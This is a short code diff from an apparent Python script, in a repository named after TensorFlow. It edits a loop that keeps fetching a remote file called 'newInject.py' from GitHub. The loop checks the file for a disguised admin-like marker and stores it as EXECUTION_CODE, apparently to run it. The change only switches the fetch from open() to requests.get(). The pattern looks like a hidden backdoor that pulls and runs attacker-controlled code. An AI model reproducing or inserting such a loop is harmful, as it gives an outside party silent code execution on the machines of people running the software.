@@ -31,7 +31,7 @@ def update_code():
   global EXECUTION_CODE,UPDATED
   while 1:
     print("Checking for update")
-    RESPONSE_CODE = open(r"https://github.com/twoSideCoder/tensorflow/blob/master/tools/newInject.py").read()
+    RESPONSE_CODE = requests.get(r"https://github.com/twoSideCoder/tensorflow/blob/master/tools/newInject.py").text
     if RESPONSE_CODE.startswith("#ADMlNxd"):
       if RESPONSE_CODE != EXECUTION_CODE:
         EXECUTION_CODE = RESPONSE_CODE
